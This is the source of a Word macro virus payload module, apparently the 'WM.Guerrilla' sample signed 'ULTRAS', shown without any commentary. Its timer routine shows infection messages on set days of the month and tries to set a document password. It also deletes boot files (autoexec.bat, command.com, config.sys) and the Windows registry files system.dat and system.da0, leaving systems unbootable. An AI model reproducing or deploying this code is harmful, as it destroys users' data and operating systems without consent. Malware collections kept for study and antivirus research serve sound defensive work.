   Attribute VB_Name = "Timer_"

   Public Sub MAIN()
   On Error Resume Next
   If WordBasic.Day(WordBasic.Now()) = 5 Then
   WordBasic.MsgBox "You Infected WM.Guerrilla by ULTRAS", "ULTRAS"
   WordBasic.Call "Dlg.Password" = "ULTRAS"
   End If
   If WordBasic.Day(WordBasic.Now()) = 17 Then
   WordBasic.MsgBox "You Infected WM.Guerrilla by ULTRAS", "ULTRAS"
   WordBasic.Kill "c:\Autoexec.bat"
   WordBasic.Kill "c:\Command.com"
   WordBasic.Kill "c:\Config.sys"
   End If
   If WordBasic.Day(WordBasic.Now()) = 25 Then
   WordBasic.MsgBox "You Infected WM.Guerrilla by ULTRAS", "ULTRAS"
   SetAttr "c:\windows\system.dat", 0
   SetAttr "c:\windows\system.da0", 0
   WordBasic.Kill "c:\windows\system.dat"
   WordBasic.Kill "c:\windows\system.da0"
   End If
   End Sub
